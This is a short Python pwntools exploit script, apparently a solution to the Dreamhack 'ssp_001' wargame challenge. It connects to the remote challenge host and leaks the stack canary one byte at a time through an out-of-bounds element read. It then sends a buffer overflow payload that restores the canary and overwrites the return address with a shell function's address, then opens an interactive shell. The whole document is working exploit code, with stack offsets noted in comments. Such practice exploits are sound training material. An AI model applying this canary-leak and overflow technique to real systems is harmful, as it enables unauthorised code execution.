from pwn import *
#p = process("./ssp_001")
p = remote('host3.dreamhack.games', 10072)

shell = 0x080486b9 
canary = b""

i = 131
while i >= 128:
    p.sendlineafter(b"> ", b"P")
    p.sendlineafter(b"Element index : ", str(i).encode())
    i -= 1
    p.recvuntil(b"is : ")
    canary += bytes.fromhex(p.recvn(2).decode())
canary = u32(canary[::-1])

p.sendlineafter(b"> ", b"E")
p.sendlineafter(b"Name Size : ", str(100).encode())
payload = b'a' * 64 + p32(canary) + b'a' * 8 + p32(shell)
p.sendafter(b"Name : ", payload)
p.interactive()

#canary = ebp - 8byte
#box = ebp - 136byte
#name = ebp - 72byte
